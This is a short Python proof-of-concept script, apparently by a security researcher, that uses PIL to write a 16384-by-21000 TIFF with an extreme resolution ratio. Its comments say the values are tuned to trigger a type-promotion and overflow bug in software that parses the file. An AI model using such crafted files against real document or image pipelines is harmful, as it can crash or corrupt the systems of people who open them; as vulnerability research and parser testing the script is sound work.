#!/usr/bin/env python
# jay@stellersjay.pub
# X: https://x.com/call_eax
# Mastadon: https://infosec.exchange/@calleax

from PIL import Image
import numpy as np

# Define the page size in pixels (width, height)
# Slightly increased dimensions to push closer to overflow conditions
page_width = 16384  # Incremented slightly to push closer to limit
page_height = 21000  # Incremented slightly

# Create a new image with the specified size and mode
image = Image.new('RGB', (page_width, page_height), color=(255, 255, 255))

# Define resolutions to trigger type promotion bug
# Fine-tune the resolution values for maximum effect without causing immediate failure
x_res = np.finfo(np.float32).max / 19000  # Slightly less extreme than before
y_res = 0.1 # Slightly decreased to increase the ratio

# Save the image as a TIFF file with these new settings
image.save('crafted_output.tiff', format='TIFF', dpi=(x_res, y_res))

print("Optimized TIFF file created successfully with dimensions:", (page_width, page_height), "and resolution:", (x_res, y_res))
